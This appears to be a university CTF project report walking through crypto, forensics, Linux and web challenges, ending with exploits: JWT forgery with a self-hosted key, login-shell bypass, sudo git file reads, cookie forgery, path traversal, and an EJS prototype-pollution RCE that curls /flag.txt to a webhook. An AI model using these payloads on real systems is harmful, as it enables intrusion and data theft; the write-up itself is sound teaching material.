<div style="display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh;">
  
  <h2>CITS1003 Project Report</h2>
  
  <p>Student ID: 24516605</p>
  <p>Student Name: Zhulin Lyu</p>

</div>

# Part 1 - Cryptography
## 1 - Advanced Emu Standard
### Step 1: Separate The Command
Based on ECB mode, I separated the command into two 16-byte blocks and encrypted each one using the website.

```bash
deactivate_speci #encrypt: 3155433d53ed30c89aef89b2e7273924
al_procedure_123 #encrypt: 4127efafc809cc1209376d039e0001f1
```
### Step 2: Concatenate The Two Encrypted Commands
```
3155433d53ed30c89aef89b2e72739244127efafc809cc1209376d039e0001f1
```
pasted the result to **Transmit encrypted command** on the website

#### Flag Found
```bash
UWA{3CB_i5_bL0cK_Ind3peNd3nt!}
```


## 2 - Emu Cook Book
### Step 1 From Base64
Whenever I encounter text that ends in "==", it is likely to be Base64. Therefore, I use From Base64 first.
#### Output
![alt text](<Screenshot 2024-04-24 at 15.55.19.png>)
### Step 2 Gunzip
From the hint: "...try to detect the file type," I considered the types of file operations we can use, such as zip. Then I searched online and found one called Gunzip.
#### Output
![alt text](<Screenshot 2024-04-24 at 15.56.43.png>)
### Step 3 URL Decode
From the hint: URL Encoding, which is also called percent encoding, I saw that after step 2, the result contained many "%". So, I chose to use URL Decode.
#### Output
![alt text](<Screenshot 2024-04-24 at 15.57.26.png>)
### Step 4 From Hexdump
After Step 3, I saw the result appeared as a hex dump, so I chose to decode it using From Hexdump.
#### Output
![alt text](<Screenshot 2024-04-24 at 15.59.22.png>)
### Step 5 From Hex
Then there was some hexadecimal data, so I chose From Hex to decode it.
#### Output
![alt text](<Screenshot 2024-04-24 at 16.02.35.png>)
### Step 6 From Base64

#### Flag Found
```bash
UWA{tH3_eMoO5_w1LL_n3V3r_sToP_d01nG_tH35e_dVmB_c1Br_cH3eF_ch4LlS}
```

## 3 - Emu Casino
### Step 1 Find Cookies
As shown in the coin flipping code `flip_coin.py`, the random number of the PRNG is based on `session_id` and `round`. From inspecting the website, I found the cookies as shown in the following picture:
![alt text](<Screenshot 2024-04-26 143639.png>)

Decode the value to obtain the session_id. Each subsequent request will always carry this session ID.

### Step 2 Decode The Randem
Using the code `solution_template.py`, we can easily determine the outcome of the next coin flip by decoding the `session_id` and changing the `round` each time before clicking the "Place Bet" button on the website.
![alt text](<Screenshot 2024-04-26 144631.png>)

#### Flag Found
```bash
UWA{R0LLl111Llli1iNg_1N_C4$$$$h!11!}
```

## 4 - EWT
### Step 1 Discover A Flaw From The Code
After reading their code, I found they checked for `HS256` or `RS256` signing algorithms, but they haven't figured out how to sign their own RS256 JWTs yet.
![alt text](<Screenshot 2024-05-16 at 14.26.51.png>)
First, I obtained a pair of public/private keys and a URL. These keys were to be used for the RS256 signature algorithm. Then, I extracted the URL of the public key from the iss declaration in the JWT payload.

### Step 2 Creat Myself Keys
I chose [RSA Key Generator](https://cryptotools.net/) to creat my own `PUBLIC KEY` and `PRIVATE KEY`, as following:

```bash
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCYagC0fediNv8zJQ0dsLRTlN13
ILZyC5iprBow8HnqKANNMdpSj4F8h7YyD5cnrLC9ZDwsW2oldksKEtIfMlq4OETo
Pgkkqyg5n4lOVp1vqKEA7Y1hdQeCvT637+57sg8wCawHFIFNMjXjhsMGlVTGkqBA
DuxeXPuGkJHK3Kk80QIDAQAB
-----END PUBLIC KEY-----
```
```bash
-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQCYagC0fediNv8zJQ0dsLRTlN13ILZyC5iprBow8HnqKANNMdpS
j4F8h7YyD5cnrLC9ZDwsW2oldksKEtIfMlq4OEToPgkkqyg5n4lOVp1vqKEA7Y1h
dQeCvT637+57sg8wCawHFIFNMjXjhsMGlVTGkqBADuxeXPuGkJHK3Kk80QIDAQAB
AoGADMupb326dTZkymhr53g0S2gOB7hJWN28XVJDiKRHt+7QCCUNTS0bE9dY5m8E
o6IN3HiTzK2IBckel6Po3BGgKAEfuGe7ZWlHpW+lD+BqRkRmaWBuOxyKtvWevycw
PHwX6B8qfB2LP9ptJOjQZzwOakQqxmr2Grqbn/J6bTfI14ECQQD3QWZVh2NW84xB
dh71pk17j17hWXkwkiJmP8kwn1VmmWZa2nOtrpB3r+0tjagY3DDm5UHJQOqiaaWp
MbxjH9IJAkEAnc3tsZzIFzRFjHy761WN/3B38lnlWMDGmA5v6d1bIsak9+7sFW2E
6NG93WGpeAVFnVnoUqxlpN7/PFGllvCmiQJAYp3ADh7ovTZ4W2ecY4fH4Z9GTYUd
NAUlGTkZqn3yVvCaBWSZvM0iK8qMQ537TKcODhmkSnvM2ahffYMryzFW2QJAQmCv
vgkzxUbwhlKlfS0kqLD3U1Lq/PVB1A4mlxnMTwl9tOikF7NUt9YZ5jhBX8Hf8Xsz
FSt9Kee/NvElFSOu+QJBALCN4b++ddrrE/TETefAzcUELwU7qEHUVW591PyDLGYe
TnGmcHn127E2F7oBYModCJyJmtg9yaKO67iVEGal+ac=
-----END RSA PRIVATE KEY-----
```
### Step 3 Create URL
The code showed that it would check if the URL is properly formatted, specifically if it starts with the following. If everything is formatted correctly, it will proceed to download the public key through this URL.
```bash
const regExp = new RegExp("^https?://");
```
Thereforte I used https://pastebin.com to create a URL  for the public key. This way, I obtained my URL.
```bash
https://pastebin.com/raw/KLQnfGfh
```
### Step 4 Find The Formatted
EMU WEB has a `hooman JWT`:
```bash
Here is your JWT token hooman: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InBlYXNhbnQtaG9vbWFuIiwiaWF0IjoxNzE1ODQzNDkyfQ.axlFrX95RzeOgp2XCKlgYeslUmGi5hjeh9s_yBCn6pI
```
Decoded it by `From Base64`, I got the correct format.
![alt text](<Screenshot 2024-05-16 at 14.24.03.png>)

As per step 1, where it was mentioned to "get the URL of the public key from the iss declaration in the JWT payload," I encrypted the following information using my PRIVATE KEY in `JWT Sign`.
```bash
{"username":"superior-emu","iss":"https://pastebin.com/raw/KLQnfGfh","iat":1715840554}
```
![alt text](<Screenshot 2024-05-20 at 14.48.27.png>)
After I pasted the output from `JWT Sign`, I got
```bash
Welcome my emu friend! Here is the flag UWA{w4iT_wHeR3_d1D_u_g1T_d4t_k3y???}
```
#### Flag Found
```bash
UWA{w4iT_wHeR3_d1D_u_g1T_d4t_k3y???}
```
![alt text](<Screenshot 2024-05-20 at 14.48.04.png>)

# Part 2 - Forensics
##  1 - Caffeinated Emus
### Step 1 Find Metadata
Metadata can be found in image info. 
I found the GPS location of this picture
<img src="Screenshot 2024-04-26 at 16.41.19.png" alt="alt text" width="262" height="382">

### Step 2 Search GPS
From Google map we can find the place name
#### Flag Found
```bash
UWA{Marvel Loch}
```

##  2 - Flightless Data
### Step 1 Install Steghide
Steghide is a command-line tool used for hiding and extracting data (such as files, text, or images). I installed Steghide in my VM using the following command:
```bash
sudo apt install steghide
```
#### Command Explain
1. "sudo": This command is used in Unix-like operating systems to execute commands with superuser privileges. It stands for "superuser do".

2. "apt": This is the package manager command-line tool used in Debian-based Linux distributions (such as Ubuntu). It's used for installing, updating, and removing software packages.

3. "install": This is an argument passed to the "apt" command, specifying that the action to be performed is the installation of a package.

4. "steghide": This is the name of the software package being installed. It's a tool for hiding data within various types of files using steganography techniques.
   
### Step 2 Decode The Image
I downloaded the image `Untitled.jpeg` from my email and then ran the following command to decode it:
```bash
steghide extract -sf Untitled.jpeg
```
#### Command Explain
1. "steghide": This is the name of the command-line tool that is being executed. It's the main program responsible for hiding and extracting data in files using steganography techniques.

2. "extract": This is one of the subcommands of the steghide tool. It specifies that the action to be performed is the extraction of hidden data from a file.

3. "-sf": This is a command-line option used with the "steghide extract" command. It stands for "stego file" and is followed by the name of the JPEG image file ("Untitled.jpeg") from which the hidden data will be extracted.
4. 
Enter the password from `email.html`, I got a data named `secret.txt`.
```bash
Hello my fellow Emu.

Fortunately the hoomans arent big brain like use and would not look for this secret message in the least significant bits of an image!

UWA{fLigHtL3sS_d4Ta_uNd3r_tH3_r4dAr}  
```
#### Flag Found
```bash
UWA{fLigHtL3sS_d4Ta_uNd3r_tH3_r4dAr}
```

##  3 - Ruffled Feathers
### Step 1 Install Ghex
Use the following command to install Ghex
```bash
sudo apt install ghex
```
### Step 2 Open A PDF
I opened two files, one was the target PDF, and the other was a normal PDF. While comparing the two, I found that the first one was missing the information for `Length`. So, I changed "currupt 272" to "Length 272".
![alt text](<Screenshot 2024-04-28 at 15.03.15.png>)
#### Flag Found
```bash
UWA{uNrUffLed_pDeF}
```
<img src="Screenshot 2024-04-28 at 15.04.34.png" alt="alt text" width="262" height="180">


## 4 - Emu in the Shell
### Step 1 Log Into Server
From the context, they asked me to use a created the following account to SSH into their server.
Base on Hint of `scp command`, I used the following command to connect the host. 
```bash
ssh -p 2022 ir-account@34.87.251.234
```
#### Command Explain
1. "ssh": This is the command-line tool used for securely connecting to remote systems or servers.
2. "-p 2022": This option specifies the port number to connect to. In this case, port 2022 is specified instead of the default SSH port (22).
3. "ir-account": This is the username used to log in to the remote system.
4. "@34.87.251.234": This is the IP address or hostname of the remote system to connect to. In this case, it's the IP address "34.87.251.234".
```bash
username: ir-account
password: topsecretpasswordforincidentresponse
```
Then I changed my directory to `/lib/x86_64-linux-gnu/security`, there were a bunch of files.
I uesd the following command to sort them and found the most recently modified file in a directory
```bash
ls -al | sort -r | head -n 5
```
In this command, `sort` is used to arrange the output by modification time in reverse order, with the most recent files appearing first.

### Step 2 Copy Files
I found that the file `pam_unix.so` had been recently modified. Following the hint, I used the command to copy it to my local device.
![alt text](<Screenshot 2024-05-16 at 17.55.00.png>)
```bash
scp -P 2022 ir-account@34.87.251.234:/lib/x86_64-linux-gnu/security/pam_unix.so ./pam_unix.so
```
#### Command Explain
1. "scp": This is the command-line tool used for securely copying files between hosts using SSH.
2. "-P 2022": This option specifies the port number to connect to. In this case, port 2022 is specified instead of the default SCP port (which is also 22).
3. "ir-account@34.87.251.234": This specifies the username ("ir-account") and the IP address (or hostname) of the remote host from which the file will be copied.
4. ":/lib/x86_64-linux-gnu/security/pam_unix.so": This is the path to the file "pam_unix.so" on the remote host that you want to copy.
5. "./pam_unix.so": This is the destination path where the file will be copied on your local machine. In this case, it's the current directory, and the copied file will be named "pam_unix.so".
   
### Step 3 Download A Tool
1. I downloaded a tool named ghidra in my VM.
2. To ensure that I have configured the Java environment variables correctly, I used the command java -version.
3. I navigated to /usr/lib/jvm and found a file containing both Java and Javac. I located /usr/lib/jvm/java-17-openjdk-amd64.
4. I set the JAVA_HOME environment variable to point to the JDK installation directory by pasting the following command:
```bash
export JAVA_HOME=/usr/lib/jvm/java-17-openjdk-amd64
```
1. Finally, I successfully opened the tool using the command ./ghidraRun.

### Step 4 Processing Files
1. I opened a new file and created a new project named "Emu in Shell". Then, I imported the file pam_unix.so.
2. Next, I right-clicked the file and chose "open with" -> "CodeBrowser".
3. After reading the article on pluggable authentication modules (PAM), I tried to find a directory named something like xxx_authentication. I found pam_sm_authenticate.
   ![alt text](<Screenshot 2024-05-19 at 22.14.27.png>)
4. I switched to decompile mode and examined their code. After analyzing it, I found a username and password.
   ![alt text](<Screenshot 2024-05-19 at 22.24.57.png>)
```bash
username: emu-haxor
password: pUpPet_m4sT3r
```
### Step 5 Find Flag
SSH into the server using the above account, after that I found a file named flag.txt. I got the flag by cat it
```bash
ssh -p 2022 emu-haxor@34.87.251.234
```
#### Flag Found
```bash
UWA{tH15_eMu_w1Ll_aLw4y5_b3_iN_uR_sH3lLlLllL!11!}
```
![alt text](<Screenshot 2024-05-19 at 22.26.49.png>)

# Part 3 - Linux and Networking
## 1 - Backdoored
### Step 1 Ports Scan
 By used the command `nmap` to scan ports
 ```bash
 nmap -p 61000-61500 -Pn 34.116.68.59
 ```
#### Command Explain
1. "nmap": This is the command-line tool used for network discovery and security auditing.
2. "-p 61000-61500": This option specifies the range of ports to be scanned. In this case, it's ports 61000 through 61500.
3. "-Pn": This option tells Nmap not to perform host discovery. By default, Nmap performs host discovery to determine which hosts are online before scanning. "-Pn" disables this and assumes the target host is online.
4. "34.116.68.59": This is the IP address of the target host that will be scanned for open ports.
   
I got a suspicious port
```bash
PORT      STATE SERVICE
61337/tcp open  unknown
```

### Step 2 Send A TCP Message
I sent a TCP message content `EMU` to the previous port
```bash
echo "EMU" | nc 34.116.68.59 61337
```
#### Command Explain
1. "echo "EMU"": This command prints the string "EMU" to the standard output.
2. "|": This is a pipe operator that redirects the standard output of the command on the left side to the standard input of the command on the right side.
3. "nc": This is the netcat command-line tool used for reading from and writing to network connections.
4. "34.116.68.59": This is the IP address of the target host to which the data will be sent.
5. "61337": This is the port number on the target host where the data will be sent.
I got a respond
```bash
 
 ______        ___   _ _____ ____    _                  
|  _ \ \      / / \ | | ____|  _ \  | |__  _   _        
| |_) \ \ /\ / /|  \| |  _| | | | | | '_ \| | | |       
|  __/ \ V  V / | |\  | |___| |_| | | |_) | |_| |       
|_|     \_/\_/  |_| \_|_____|____/  |_.__/ \__, |       
    _                             _____    |___/        
   / \   _ __   __ _ _ __ _   _  | ____|_ __ ___  _   _ 
  / _ \ | '_ \ / _` | '__| | | | |  _| | '_ ` _ \| | | |
 / ___ \| | | | (_| | |  | |_| | | |___| | | | | | |_| |
/_/   \_\_| |_|\__, |_|   \__, | |_____|_| |_| |_|\__,_|
               |___/      |___/                         

Did you really think you would find our backdoor so easily? :P

Good effort though, here's a flag for your attempt: UWA{4dvanC3d_p0r7_5sc4nN1nG?1!?1}
```
#### Flag Found
```bash
UWA{4dvanC3d_p0r7_5sc4nN1nG?1!?1}
```

## 2 - Git Gud
### Step 1 Download Git Repository
Using `git clone` to download a emu git repository
```bash
git clone http://34.116.68.59:8000/emu.git 
```
I got a folder called `emu`
### Step 2 Open Emu Folder
I used `cat` to open the `README.txt` inside folder, got following content:
```bash
UWA{N()w_y0U_kN0W_40w_2_u53_g17!1!!}
--------------------------------------------------

To Angry Emu hacker,

As per our agreement, I have set up some SSH credentials for you to access our server:

username: emu001
password: feathers4life24

To make sure only us birbs can get in I set a login shell to stop pesky hoomans getting in. Just do that SSH trick I taught you about to get in.

Delete this message after you read it!

Best regards,
Mr. X

```

#### Flag Found
```bash
UWA{N()w_y0U_kN0W_40w_2_u53_g17!1!!}
```

## 3 - SSH Tricks
### Step 1 Bypass The Login
```bash
ssh -t -p 2022 emu001@34.116.68.59 "bash -i"
```
### Step 2 Copy Image
```bash
scp -P 2022 emu001@34.116.68.59:/home/emu001/top_secret.png ./top_secret.png
```
#### Flag Found
```bash
UWA{how_did_u_get_past_that_login_shell?????}
```
![alt text](654a8c2354d76a43291a9ab8ddc3b5f5.jpeg)

## 4 - Git Gud or GTFO Bin
### Step 1 Change The Direction
To log in as step 3
```bash
ssh -t -p 2022 emu001@34.116.68.59 "bash -i"
```
From the text, the flag is in `/home/mr_x/flag4.txt`. So I changed to the directory using the following command.
```bash
cd /home/mr_x
```
### Step 2 Use Git Comman
File `flag4.txt` cound not open directly. From hints, I found [GTFOBins git page linked](https://gtfobins.github.io/gtfobins/git/) .
There is a one called `Read`
![alt text](<Screenshot 2024-05-14 at 17.13.23.png>)
I tried the command
```bash
LFILE=flag4.txt
git diff /dev/null $LFILE
```
the result showed 
```bash
error: open("flag4.txt"): Permission denied
fatal: cannot hash flag4.txt
```
### Step 3 Use Sudo Comman
From context, there was a `sudo` command use together with `git`. Therefor I changed my command as the following:
```bash
LFILE=flag4.txt
sudo -u mr_x git diff /dev/null $LFILE
```
#### Command Explain
1. LFILE=flag4.txt: This sets the variable LFILE to the value flag4.txt.
2. sudo -u mr_x: This executes the subsequent command (git diff /dev/null $LFILE) with elevated privileges as the user mr_x.
3. git diff /dev/null $LFILE: This runs the git diff command, comparing the file /dev/null (which represents an empty file or null device) with the file specified in the variable $LFILE.

After used the same password from the Question1, I got the flag.

#### Flag Found
```bash
UWA{i_G0T_g1t_g0oD_4Nd_gTf0_B1N5d_InT0_yR_aCcOunT!!1}
```
![alt text](<Screenshot 2024-05-14 at 17.16.50.png>)


# Part 4 - Vulnerabilities
## Feathered Forum - Part 1
### Step 1 Find Cookie
From the code the Emus wrote that handles this Cookie token verification. I found they intend to check the cookie of name
```bash
request.cookies.get('username', None) in emu_usernames:
```
compared with username in EMU_USERS_ACCOUNTS.
Then I saw their source code `app.py`. There are some usernames can be found.
```bash
EMU_USERS_ACCOUNTS = [
    {
        "username": "BeakMaster",
        "password": os.urandom(16).hex()
    },
    {
        "username": "OstrichOutlaw",
        "password": os.urandom(16).hex()
    },
    {
        "username": "H4ck3r3mu123",
        "password": os.urandom(16).hex()
    }
]
```

### Step 2 Setting Cookie
By inspecting the browser, I set a new cookie on this website with the name 'username' and the value 'BeakMaster'.
![alt text](<Screenshot 2024-05-06 at 17.44.25.png>)
### Step 3 Bypass The Login Page
After saving Step 2, I reloaded the page and gained access to the forum at `/forum` by appending it to the end of the URL.
```bash
http://34.87.251.234:8000/forum
```

#### Flag Found
```bash
UWA{C00k13333z_4r3_Th3_W4y_T0_4n_3mu's_H34rt}
```
![alt text](<Screenshot 2024-05-06 at 17.51.24.png>)

## Feathered Forum - Part 2
### Step 1 Find Forum
After Part 1, I was in the Emu Forum, and read their posts. I found one that may be talking about CWE.
![alt text](<Screenshot 2024-05-08 at 16.00.39.png>)
### Step 2 
In this forum, I found they talked about CWE-22.
#### Flag Found
```bash
UWA{CWE-22}
```

## Feathered Forum - Part 3
### Step 1 Explor Code
Base on the following code, I found they use `file_path` after "./static".
```bash
@app.route('/static')
def get_static_file():
    file_path = request.args.get('filename')

    # Make sure the hoomans cannot just read any file
    # Set the start of the file path to "./static"
    file_path = os.path.join("./static", file_path)

    if os.path.exists(file_path):
        return send_file(file_path)
    else:
        return "File not found", 404
```
Which means I can find `file_path` from the picture.
### Step 2 Change The Path
I intend to change the path of the picture from the Part 2 forum 
```bash
/static?filename=images/emu-hacker0.jpg
```
Following the hint, `../` moves to the parent folder. So, I changed the path to the following, which automatically downloaded a file called `config.yaml`.
```bash
http://34.87.251.234:8000/static?filename=../config.yaml
```
### Step 3 Read A File
For reading the ./config.yaml file, I use `cat` command to open it.
![alt text](<Screenshot 2024-05-08 at 16.30.59.png>)
#### Flag Found
```bash
UWA{Dir_Trav3rs@l_Flight}
```

## Emu Apothecary
### Step 1 Read The Code
From their code, what this code does is process the user input by parsing each attribute value in the input in the format {ingredientName}.{attribute} and storing it in the baseIngredients object. However, it is not perfectly safe to mention prototype contamination in the comments and try to prevent it by checking whether the key name contains a dot.

 ![alt text](<Screenshot 2024-05-20 at 11.57.21.png>)

### Step 2 Unique URL
as Context suggested, Copy my unique URL from the webhook website and replace {webhook} in the following terminal command. This is the command that I want to execute on the website that will send /flag.txt to my webhook.
```bash
curl -F flag=@/flag.txt {webhook}
```

From the hint, it talked about a Prototype Pollution gadget that could be exploited to get RCE when EJS renders a template.

Then I went to the website got my unique URL, as the following:
https://webhook.site/64474761-96c2-402d-aac5-1f08c43567f9


### Step 3 A Prototype Contamination Attack
![alt text](<Screenshot 2024-05-20 at 12.18.16.png>)
The web application is using the EJS template engine for rendering templates. [The article](https://docs.google.com/presentation/d/1Ae38Nv6mUntog3AIcI9m_IuBfoxBWoEsw7njI2x8EX0/edit#slide=id.g22e32f4d19a_0_5) talked about a Prototype Pollution gadget that could be exploited to get RCE when EJS renders a template.

I then changed the website URL to the following one:
```bash
http://34.87.251.234:8001/?__proto__.client=1&__proto__.escapeFunction=JSON.stringify;%20process.mainModule.require(%27child_process%27).exec(curl%20-F%20flag=@/flag.txt%20{https://webhook.site/64474761-96c2-402d-aac5-1f08c43567f9})
```
![alt text](<Screenshot 2024-05-20 at 12.37.21.png>)
The curl command tried to send a POST request to https://webhook.site/64474761-96c2-402d-aac5-1f08c43567f9, and will be the local file/flag. TXT as the content of the form data sent out.

![alt text](<Screenshot 2024-05-20 at 12.06.06.png>)
#### Flag Found
```bash
UWA{p0LlUtInG_tH3_eMu5_r3CiP3_w33B5iT3!!1!}
```
![alt text](<Screenshot 2024-05-20 at 12.07.30.png>)